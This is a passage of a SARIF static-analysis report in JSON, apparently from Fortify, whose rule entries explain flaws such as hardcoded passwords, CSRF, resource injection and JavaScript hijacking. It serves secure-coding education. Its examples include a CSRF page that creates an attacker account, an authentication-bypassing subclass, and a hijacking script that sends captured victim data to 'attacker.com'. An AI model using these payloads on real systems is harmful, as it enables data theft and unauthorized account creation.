                "text": "Hardcoded passwords may compromise system security in a way that cannot be easily remedied."
              },
              "fullDescription": {
                "text": "It is never a good idea to hardcode a password. Not only does hardcoding a password allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. Once the code is in production, the password cannot be changed without patching the software. If the account protected by the password is compromised, the owners of the system will be forced to choose between security and availability.\r\n\r\nIn this case a hardcoded password was found in the call to <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example 1:** The following code uses a hardcoded password to connect to a database:\r\n\r\n`\n...\nDriverManager.getConnection(url, \"scott\", \"tiger\");\n...\n`\r\n\r\nThis code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is likely no way to change the database user \"scott\" with a password of \"tiger\" unless the program is patched. An employee with access to this information could use it to break into the system. Even worse, if attackers have access to the bytecode for the application they can use the `javap -c` command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:\r\n\r\n`\njavap -c ConnMngr.class\r\n\r\n22: ldc   #36; //String jdbc:mysql://ixne.com/rxsql\n24: ldc   #38; //String scott\n26: ldc   #17; //String tiger\n`\r\n\r\nIn the mobile world, password management is even trickier, considering a much higher chance of device loss.\n**Example 2:** The code below uses hardcoded username and password to setup authentication for viewing protected pages with Android's WebView.\n`\n...\nwebview.setWebViewClient(new WebViewClient() {\n  public void onReceivedHttpAuthRequest(WebView view,\n        HttpAuthHandler handler, String host, String realm) {\n    handler.proceed(\"guest\", \"allow\");\n  }\n});\n...\n`\r\n\r\nSimilar to Example 1, this code will run successfully, but anyone who has access to it will have access to the password."
              },
              "defaultConfiguration": {
                "level": "error",
                "properties": {
                  "DefaultSeverity": "4.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "259",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "798",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4",
                "Impact": "4.0",
                "Probability": "4.0"
              }
            },
            {
              "id": "C09B4A17-F100-44a0-B315-6C7A39F01DA1",
              "guid": "C09B4A17-F100-44a0-B315-6C7A39F01DA1",
              "name": "Environment/Password Management/Password in Configuration File",
              "shortDescription": {
                "text": "Storing a plaintext password in a configuration file may result in a system compromise."
              },
              "fullDescription": {
                "text": "Storing a plaintext password in a configuration file allows anyone who can read the file access to the password-protected resource. Developers sometimes believe that they cannot defend the application from someone who has access to the configuration, but this attitude makes an attacker's job easier. Good password management guidelines require that a password never be stored in plaintext.\r\n\r\nIn this case, a hardcoded password exists in {PrimaryLocation.file} at line {PrimaryLocation.line}."
              },
              "defaultConfiguration": {
                "level": "error",
                "properties": {
                  "DefaultSeverity": "4.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "13",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "260",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "555",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4",
                "Impact": "4.0",
                "Probability": "4.0"
              }
            },
            {
              "id": "95ACE7A2-BF14-4254-AFD3-22769C5FDC5F",
              "guid": "95ACE7A2-BF14-4254-AFD3-22769C5FDC5F",
              "name": "Code Quality/Code Correctness/Constructor Invokes Overridable Function",
              "shortDescription": {
                "text": "A constructor of {EnclosingClass.name} in {PrimaryLocation.file} at line {PrimaryLocation.line} calls a function that can be overridden by an attacker.\r\nA constructor of the class calls a function that can be overridden."
              },
              "fullDescription": {
                "text": "When a constructor calls an overridable function, it may allow an attacker to access the `this` reference prior to the object being fully initialized, which can in turn lead to a vulnerability.\r\n\r\n**Example 1:** The following calls a method that can be overridden.\r\n\r\n`\n  ...\n  class User {\n    private String username;\n    private boolean valid;\n    public User(String username, String password){\n      this.username = username;\n      this.valid = validateUser(username, password);\n    }\n    public boolean validateUser(String username, String password){\n      //validate user is real and can authenticate\n      ...\n    }\n    public final boolean isValid(){\n      return valid;\n    }\n  }\n`\r\n\r\nSince the function `validateUser` and the class are not `final`, it means that they can be overridden, and then initializing a variable to the subclass that overrides this function would allow bypassing of the `validateUser` functionality. For example: \r\n\r\n`\n  ...\n  class Attacker extends User{\n    public Attacker(String username, String password){\n      super(username, password);\n    }\n    public boolean validateUser(String username, String password){\n      return true;\n    }\n  }\n  ...\n  class MainClass{\n    public static void main(String[] args){\n      User hacker = new Attacker(\"Evil\", \"Hacker\");\n      if (hacker.isValid()){\n        System.out.println(\"Attack successful!\");\n      }else{\n        System.out.println(\"Attack failed\");\n      }\n    }\n  }\n`\r\n\r\nThe above code prints &quot;Attack successful!&quot;, since the `Attacker` class overrides the `validateUser()` function that is called from the constructor of the superclass `User`, and Java will first look in the subclass for functions called from the constructor."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "None",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "2.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "7864EF8A-A7EA-4077-AADB-A6D6DFAD3235",
              "guid": "7864EF8A-A7EA-4077-AADB-A6D6DFAD3235",
              "name": "Security Features/Key Management/Hardcoded Encryption Key",
              "shortDescription": {
                "text": "Hardcoded encryption keys may compromise system security in a way that cannot be easily remedied."
              },
              "fullDescription": {
                "text": "It is never a good idea to hardcode an encryption key because it allows all of the project's developers to view the encryption key, and makes fixing the problem extremely difficult. Once the code is in production, the encryption key cannot be changed without patching the software. If the account that is protected by the encryption key is compromised, the owners of the system will be forced to choose between security and availability.\r\n\r\nIn this case the encryption key is located at <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example 1:** The following code uses a hardcoded encryption key:\r\n\r\n`\n...\nprivate static final String encryptionKey = \"lakdsljkalkjlksdfkl\";\nbyte[] keyBytes = encryptionKey.getBytes();\nSecretKeySpec key = new SecretKeySpec(keyBytes, \"AES\");\nCipher encryptCipher = Cipher.getInstance(\"AES\");\nencryptCipher.init(Cipher.ENCRYPT_MODE, key);\n...\n`\r\n\r\nAnyone who has access to the code will have access to the encryption key. Once the application has shipped, there is no way to change the encryption key unless the program is patched. An employee with access to this information could use it to break into the system. Even worse, if attackers had access to the executable for the application, they could extract the encryption key value."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "321",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "3.0",
                "Impact": "3.0",
                "Probability": "4.0"
              }
            },
            {
              "id": "B7DFF4A8-9817-4418-A35B-E70D10DC825E",
              "guid": "B7DFF4A8-9817-4418-A35B-E70D10DC825E",
              "name": "Code Quality/Unreleased Resource/Database",
              "shortDescription": {
                "text": "The function {EnclosingFunction.name} in {PrimaryLocation.file} sometimes fails to release a database resource allocated by {FirstTransitionFunction} on line {FirstTraceLocation.line}.\r\nThe program can potentially fail to release a database resource."
              },
              "fullDescription": {
                "text": "Resource leaks have at least two common causes:\r\n\r\n- Error conditions and other exceptional circumstances.\r\n\r\n- Confusion over which part of the program is responsible for releasing the resource.\r\n\r\nMost unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker may be able to launch a denial of service attack by depleting the resource pool.\r\n\r\n**Example:** Under normal conditions, the following code executes a database query, processes the results returned by the database, and closes the allocated statement object. But if an exception occurs while executing the SQL or processing the results, the statement object will not be closed. If this happens often enough, the database will run out of available cursors and not be able to execute any more SQL queries.\n`\n  Statement stmt = conn.createStatement();\n  ResultSet rs = stmt.executeQuery(CXN_SQL);\n  harvestResults(rs);\n  stmt.close();\n`\r\r\n\r\nIn this case, there are program paths on which the Database Connection allocated in {FirstTraceLocation.file} at line {FirstTraceLocation.line} is not released."
              },
              "defaultConfiguration": {
                "level": "error",
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "404",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4.0",
                "Impact": "5.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "30DFC293-D2B8-463A-9952-257A44B5339C",
              "guid": "30DFC293-D2B8-463A-9952-257A44B5339C",
              "name": "Encapsulation/Cross-Site Request Forgery",
              "shortDescription": {
                "text": "The HTTP request at {PrimaryLocation.file} line {PrimaryLocation.line} must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.\r\nHTTP requests must contain a user-specific secret in order to prevent an attacker from making unauthorized requests."
              },
              "fullDescription": {
                "text": "A cross-site request forgery (CSRF) vulnerability occurs when:\n1. A web application uses session cookies.\r\n\r\n2. The application acts on an HTTP request without verifying that the request was made with the user's consent.\r\n\r\nIn this case the application generates an HTTP request at {PrimaryLocation.file} line {PrimaryLocation.line}.\r\n\r\nA nonce is a cryptographic random value that is sent with a message to prevent replay attacks. If the request does not contain a nonce that proves its provenance, the code that handles the request is vulnerable to a CSRF attack (unless it does not change the state of the application). This means a web application that uses session cookies has to take special precautions in order to ensure that an attacker can't trick users into submitting bogus requests. Imagine a web application that allows administrators to create new accounts as follows:\r\n\r\n`\n  var req = new XMLHttpRequest();\n  req.open(\"POST\", \"/new_user\", true);\n  body = addToPost(body, new_username);\n  body = addToPost(body, new_passwd);\n  req.send(body);\n`\r\n\r\nAn attacker might set up a malicious web site that contains the following code.\r\n\r\n`\n  var req = new XMLHttpRequest();\n  req.open(\"POST\", \"http://www.example.com/new_user\", true);\n  body = addToPost(body, \"attacker\");\n  body = addToPost(body, \"haha\");\n  req.send(body);\n`\r\n\r\nIf an administrator for `example.com` visits the malicious page while she has an active session on the site, she will unwittingly create an account for the attacker. This is a CSRF attack. It is possible because the application does not have a way to determine the provenance of the request. Any request could be a legitimate action chosen by the user or a faked action set up by an attacker. The attacker does not get to see the Web page that the bogus request generates, so the attack technique is only useful for requests that alter the state of the application.\r\n\r\nApplications that pass the session identifier in the URL rather than as a cookie do not have CSRF problems because there is no way for the attacker to access the session identifier and include it as part of the bogus request.\nCSRF is entry number five on the 2007 OWASP Top 10 list."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "352",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "1.0",
                "Impact": "2.0",
                "Probability": "2.0"
              }
            },
            {
              "id": "FE7263A8-4A1C-4048-9F53-5B892AC7533A",
              "guid": "FE7263A8-4A1C-4048-9F53-5B892AC7533A",
              "name": "Code Quality/Poor Style/Confusing Naming",
              "shortDescription": {
                "text": "The class {EnclosingClass.name} contains a field and a method both named {$f.name$}, which is confusing.\r\nThe class contains a field and a method with the same name."
              },
              "fullDescription": {
                "text": "It is confusing to have a member field and a method with the same name. It makes it easy for a programmer to accidentally call the method when attempting to access the field or vice versa.\r\n\r\n**Example 1:**\r\n\r\n`\npublic class Totaller {\n  private int total;\n  public int total() {\n    ...\n  }\n}\n`"
              },
              "defaultConfiguration": {
                "level": "note",
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "398",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "5.0",
                "Impact": "1.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "625EEE1F-464F-42DC-85D6-269A637EF747",
              "guid": "625EEE1F-464F-42DC-85D6-269A637EF747",
              "name": "Encapsulation/J2EE Bad Practices/Leftover Debug Code",
              "shortDescription": {
                "text": "The class {EnclosingClass.name} contains debug code, which can create unintended entry points in a deployed web application.\r\nDebug code can create unintended entry points in a deployed web application."
              },
              "fullDescription": {
                "text": "A common development practice is to add \"back door\" code specifically designed for debugging or testing purposes that is not intended to be shipped or deployed with the application. When this sort of debug code is accidentally left in the application, the application is open to unintended modes of interaction. These back door entry points create security risks because they are not considered during design or testing and fall outside of the expected operating conditions of the application.\r\n\r\nThe most common example of forgotten debug code is a `main()` method appearing in a web application. Although this is an acceptable practice during product development, classes that are part of a production J2EE application should not define a `main()`."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "489",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "8F3B2393-5D1E-4860-A96F-0F6E0274923F",
              "guid": "8F3B2393-5D1E-4860-A96F-0F6E0274923F",
              "name": "Input Validation and Representation/Resource Injection",
              "shortDescription": {
                "text": "Attackers are able to control the resource identifier argument to {PrimaryCall.name} at {PrimaryLocation.file} line {PrimaryLocation.line}, which could enable them to access or modify otherwise protected system resources.\r\nAllowing user input to control resource identifiers could enable an attacker to access or modify otherwise protected system resources."
              },
              "fullDescription": {
                "text": "A resource injection issue occurs when the following two conditions are met:\r\n\r\n1. An attacker is able to specify the identifier used to access a system resource.\r\n\r\nFor example, an attacker may be able to specify a port number to be used to connect to a network resource.\r\n\r\n2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.\r\n\r\nFor example, the program may give the attacker the ability to transmit sensitive information to a third-party server.\r\n\r\nIn this case, the attacker may specify the value that enters the program at <Replace key=\"SourceFunction\" link=\"SourceLocation\"/> in {SourceLocation.file} at line {SourceLocation.line}, and this value is used to access a system resource at <Replace key=\"SinkFunction\" link=\"SinkLocation\"/> in {SinkLocation.file} at line {SinkLocation.line}.\r\n\r\nNote: Resource injections involving resources stored on the file system are reported in a separate category named path manipulation. See the path manipulation description for further details of this vulnerability.\r\n\r\n**Example 1:** The following code uses a port number read from an HTTP request to create a socket.\r\n\r\n`\nString remotePort = request.getParameter(\"remotePort\");\n...\nServerSocket srvr = new ServerSocket(remotePort);\nSocket skt = srvr.accept();\n...\n`\r\n\r\nSome think that in the mobile world, classic web application vulnerabilities, such as resource injection, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.\r\n\r\n**Example 2:** The following code uses a URL read from an Android intent to load the page in `WebView`.\r\n\r\n`\n...\n\tWebView webview = new WebView(this);\n\tsetContentView(webview);\n        String url = this.getIntent().getExtras().getString(\"url\");\n\twebview.loadUrl(url);\n...\n`\r\n\r\nThe kind of resource affected by user input indicates the kind of content that may be dangerous. For example, data containing special characters like period, slash, and backslash are risky when used in methods that interact with the file system. Similarly, data that contains URLs and URIs is risky for functions that create remote connections."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "99",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4.0",
                "Impact": "2.0",
                "Probability": "3.0"
              }
            },
            {
              "id": "F972FE42-6C15-47D2-BD5C-448166A574C2",
              "guid": "F972FE42-6C15-47D2-BD5C-448166A574C2",
              "name": "Encapsulation/Poor Logging Practice/Use of a System Output Stream",
              "shortDescription": {
                "text": "Using {PrimaryCall.name} rather than a dedicated logging facility makes it difficult to monitor the behavior of the program.\r\nUsing `System.out` or `System.err` rather than a dedicated logging facility makes it difficult to monitor the behavior of the program."
              },
              "fullDescription": {
                "text": "**Example 1:** The first Java program that a developer learns to write often looks like this:\r\n\r\n`\npublic class MyClass\n  public static void main(String[] args) {\n    System.out.println(\"hello world\");\n  }\n}\n`\r\n\r\nWhile most programmers go on to learn many nuances and subtleties about Java, a surprising number hang on to this first lesson and never give up on writing messages to standard output using `System.out.println()`.\r\n\r\nThe problem is that writing directly to standard output or standard error is often used as an unstructured form of logging. Structured logging facilities provide features like logging levels, uniform formatting, a logger identifier, timestamps, and, perhaps most critically, the ability to direct the log messages to the right place. When the use of system output streams is jumbled together with the code that uses loggers properly, the result is often a well-kept log that is missing critical information.\r\n\r\nDevelopers widely accept the need for structured logging, but many continue to use system output streams in their \"pre-production\" development. If the code you are reviewing is past the initial phases of development, use of `System.out` or `System.err` may indicate an oversight in the move to a structured logging system."
              },
              "defaultConfiguration": {
                "level": "note",
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "398",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "5.0",
                "Impact": "1.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "8FD4CFCD-A6F9-4FF1-A8D9-18C029580FB5",
              "guid": "8FD4CFCD-A6F9-4FF1-A8D9-18C029580FB5",
              "name": "Encapsulation/JavaScript Hijacking/Vulnerable Framework",
              "shortDescription": {
                "text": "Applications that use JavaScript notation to transport sensitive data can be vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data from a vulnerable application."
              },
              "fullDescription": {
                "text": "An application may be vulnerable to JavaScript hijacking if it: 1) Uses JavaScript objects as a data transfer format 2) Handles confidential data. Because JavaScript hijacking vulnerabilities do not occur as a direct result of a coding mistake, the Fortify Secure Coding Rulepacks call attention to potential JavaScript hijacking vulnerabilities by identifying code that appears to generate JavaScript in an HTTP response.\r\n\r\nWeb browsers enforce the Same Origin Policy in order to protect users from malicious websites. The Same Origin Policy requires that, in order for JavaScript to access the contents of a web page, both the JavaScript and the web page must originate from the same domain. Without the Same Origin Policy, a malicious website could serve up JavaScript that loads sensitive information from other websites using a client's credentials, culls through it, and communicates it back to the attacker. JavaScript hijacking allows an attacker to bypass the Same Origin Policy in the case that a web application uses JavaScript to communicate confidential information. The loophole in the Same Origin Policy is that it allows JavaScript from any website to be included and executed in the context of any other website. Even though a malicious site cannot directly examine any data loaded from a vulnerable site on the client, it can still take advantage of this loophole by setting up an environment that allows it to witness the execution of the JavaScript and any relevant side effects it may have. Since many Web 2.0 applications use JavaScript as a data transport mechanism, they are often vulnerable while traditional web applications are not.\r\n\r\nThe most popular format for communicating information in JavaScript is JavaScript Object Notation (JSON). The JSON RFC defines JSON syntax to be a subset of JavaScript object literal syntax. JSON is based on two types of data structures: arrays and objects. Any data transport format where messages can be interpreted as one or more valid JavaScript statements is vulnerable to JavaScript hijacking. JSON makes JavaScript hijacking easier by the fact that a JSON array stands on its own as a valid JavaScript statement. Since arrays are a natural form for communicating lists, they are commonly used wherever an application needs to communicate multiple values. Put another way, a JSON array is directly vulnerable to JavaScript hijacking. A JSON object is only vulnerable if it is wrapped in some other JavaScript construct that stands on its own as a valid JavaScript statement.\r\n\r\n**Example 1:** The following example begins by showing a legitimate JSON interaction between the client and server components of a web application used to manage sales leads. It goes on to show how an attacker may mimic the client and gain access to the confidential data the server returns. Note that this example is written for Mozilla-based browsers. Other mainstream browsers do not allow native constructors to be overridden when an object is created without the use of the new operator.\r\n\r\nThe client requests data from a server and evaluates the result as JSON with the following code:\r\n\r\n`\nvar object;\nvar req = new XMLHttpRequest();\nreq.open(\"GET\", \"/object.json\",true);\nreq.onreadystatechange = function () {\n  if (req.readyState == 4) {\n    var txt = req.responseText;\n    object = eval(\"(\" + txt + \")\");\n    req = null;\n  }\n};\nreq.send(null);\n`\r\n\r\nWhen the code runs, it generates an HTTP request that looks like this:\r\n\r\n`\nGET /object.json HTTP/1.1\n...\nHost: www.example.com\nCookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR\n`\r\n\r\n(In this HTTP response and the one that follows we have elided HTTP headers that are not directly relevant to this explanation.)\nThe server responds with an array in JSON format:\r\n\r\n`\nHTTP/1.1 200 OK\nCache-control: private\nContent-Type: text/JavaScript; charset=utf-8\n...\n[{\"fname\":\"Brian\", \"lname\":\"Chess\", \"phone\":\"6502135600\",\n  \"purchases\":60000.00, \"email\":\"brian@example.com\" },\n {\"fname\":\"Katrina\", \"lname\":\"O'Neil\", \"phone\":\"6502135600\",\n  \"purchases\":120000.00, \"email\":\"katrina@example.com\" },\n {\"fname\":\"Jacob\", \"lname\":\"West\", \"phone\":\"6502135600\",\n  \"purchases\":45000.00, \"email\":\"jacob@example.com\" }]\n`\r\n\r\nIn this case, the JSON contains confidential information associated with the current user (a list of sales leads). Other users cannot access this information without knowing the user's session identifier. (In most modern web applications, the session identifier is stored as a cookie.) However, if a victim visits a malicious website, the malicious site can retrieve the information using JavaScript hijacking. If a victim can be tricked into visiting a web page that contains the following malicious code, the victim's lead information will be sent to the attacker's web site.\r\n\r\n`\n&lt;script&gt;\n// override the constructor used to create all objects so\n// that whenever the \"email\" field is set, the method\n// captureObject() will run. Since \"email\" is the final field,\n// this will allow us to steal the whole object.\nfunction Object() {\n this.email setter = captureObject;\n}\r\n\r\n// Send the captured object back to the attacker's web site\nfunction captureObject(x) {\n  var objString = \"\";\n  for (fld in this) {\n    objString += fld + \": \" + this[fld] + \", \";\n  }\n  objString += \"email: \" + x;\n  var req = new XMLHttpRequest();\n  req.open(\"GET\", \"http://attacker.com?obj=\" +\n           escape(objString),true);\n  req.send(null);\n}\n&lt;/script&gt;\r\n\r\n&lt;!-- Use a script tag to bring in victim's data --&gt;\n&lt;script src=\"http://www.example.com/object.json\"&gt;&lt;/script&gt;\n`\r\n\r\nThe malicious code uses a script tag to include the JSON object in the current page. The web browser will send up the appropriate session cookie with the request. In other words, this request will be handled just as though it had originated from the legitimate application.\r\n\r\nWhen the JSON array arrives on the client, it will be evaluated in the context of the malicious page. In order to witness the evaluation of the JSON, the malicious page has redefined the JavaScript function used to create new objects. In this way, the malicious code has inserted a hook that allows it to get access to the creation of each object and transmit the object's contents back to the malicious site. Other attacks might override the default constructor for arrays instead. Applications that are built to be used in a mashup sometimes invoke a callback function at the end of each JavaScript message. The callback function is meant to be defined by another application in the mashup. A callback function makes a JavaScript hijacking attack a trivial affair -- all the attacker has to do is define the function. An application can be mashup-friendly or it can be secure, but it cannot be both. If the user is not logged into the vulnerable site, the attacker may compensate by asking the user to log in and then displaying the legitimate login page for the application.\r\n\r\nThis is not a phishing attack -- the attacker does not gain access to the user's credentials -- so anti-phishing countermeasures will not be able to defeat the attack. More complex attacks could make a series of requests to the application by using JavaScript to dynamically generate script tags. This same technique is sometimes used to create application mashups. The only difference is that, in this mashup scenario, one of the applications involved is malicious."
              },
              "defaultConfiguration": {
                "level": "note",
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "None",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "2.0",
                "Impact": "1.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "3CB1D23E-CE0D-47E5-B387-F1026CDA0D64",
              "guid": "3CB1D23E-CE0D-47E5-B387-F1026CDA0D64",
              "name": "Security Features/Insecure Randomness/User-Controlled Seed",
              "shortDescription": {
                "text": "The function {EnclosingFunction.name} in {PrimaryLocation.file} is passed a tainted value for the seed. Functions that generate random or pseudorandom values, which are passed a seed, should not be called with a tainted integer argument.\r\nFunctions that generate random or pseudorandom values, which are passed a seed, should not be called with a tainted integer argument."
              },
              "fullDescription": {
                "text": "`Random.setSeed()` should not be called with a tainted integer argument. Doing so allows an attacker to control the value used to seed the pseudorandom number generator, and therefore predict the sequence of values (usually integers) produced by calls to `Random.nextInt()`, `Random.nextShort()`, `Random.nextLong()`, or returned by `Random.nextBoolean()`, or set in `Random.nextBytes(byte[])`."
              },
              "defaultConfiguration": {
                "level": "error",
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "335",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "2.0",
                "Impact": "4.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "B32F92AC-9605-0987-E73B-CCB28279AA24",
              "guid": "B32F92AC-9605-4987-873B-CCB28279AA24",
              "name": "Code Quality/Null Dereference",
              "shortDescription": {
                "text": "The method {EnclosingFunction.name} in {PrimaryLocation.file} can crash the program by dereferencing a null pointer on line {PrimaryLocation.line}.\r\nThe program can potentially dereference a null pointer, thereby causing a null pointer exception."
              },
              "fullDescription": {
                "text": "Null pointer exceptions usually occur when one or more of the programmer's assumptions is violated. A dereference-after-store error occurs when a program explicitly sets an object to `null` and dereferences it later. This error is often the result of a programmer initializing a variable to `null` when it is declared.\r\n\r\nIn this case, the variable can be `null` when it is dereferenced at line {PrimaryLocation.line}, thereby causing a null pointer exception.\r\n\r\nMost null pointer issues result in general software reliability problems, but if attackers can intentionally trigger a null pointer dereference, they can use the resulting exception to bypass security logic or to cause the application to reveal debugging information that will be valuable in planning subsequent attacks.\r\n\r\n**Example:** In the following code, the programmer explicitly sets the variable `foo` to `null`. Later, the programmer dereferences `foo` before checking the object for a null value.\r\n\r\n`\nFoo foo = null;\n...\nfoo.setBar(val);\n...\n}\n`"
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "476",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4.0",
                "Impact": "3.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "24023E22-D6C7-4D5C-B049-38B7EFC8B408",
              "guid": "24023E22-D6C7-4D5C-B049-38B7EFC8B408",
              "name": "Input Validation and Representation/Denial of Service",
              "shortDescription": {
                "text": "The call to {PrimaryCall.name} at {PrimaryLocation.file} line {PrimaryLocation.line} might allow an attacker to crash the program or otherwise make it unavailable to legitimate users.\r\nAn attacker could cause the program to crash or otherwise become unavailable to legitimate users."
              },
              "fullDescription": {
                "text": "Attackers may be able to deny service to legitimate users by flooding the application with requests, but flooding attacks can often be defused at the network layer. More problematic are bugs that allow an attacker to overload the application using a small number of requests. Such bugs allow the attacker to specify the quantity of system resources their requests will consume or the duration for which they will use them.\r\n\r\n**Example 1:** The following code allows a user to specify the amount of time for which a thread will sleep. By specifying a large number, an attacker may tie up the thread indefinitely. With a small number of requests, the attacker may deplete the application's thread pool.\r\n\r\n`\n  int usrSleepTime = Integer.parseInt(usrInput);\n  Thread.sleep(usrSleepTime);\n`\r\n\r\n**Example 2:** The following code reads a String from a zip file. Because it uses the `readLine()` method, it will read an unbounded amount of input. An attacker may take advantage of this code to cause an `OutOfMemoryException` or to consume a large amount of memory so that the program spends more time performing garbage collection or runs out of memory during some subsequent operation.\r\n\r\n`\n  InputStream zipInput = zipFile.getInputStream(zipEntry);\n  Reader zipReader = new InputStreamReader(zipInput);\n  BufferedReader br = new BufferedReader(zipReader);\n  String line = br.readLine();\n`"
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "730",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "2.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "9A54AA40-B73E-46EE-846C-6F44F4260A49",
              "guid": "9A54AA40-B73E-46EE-846C-6F44F4260A49",
              "name": "Input Validation and Representation/Dynamic Code Evaluation/Unsafe Deserialization",
              "shortDescription": {
                "text": "Deserializing user-controlled object streams at runtime can allow attackers to execute arbitrary code on the server, abuse application logic, and/or lead to denial of service."
              },
              "fullDescription": {
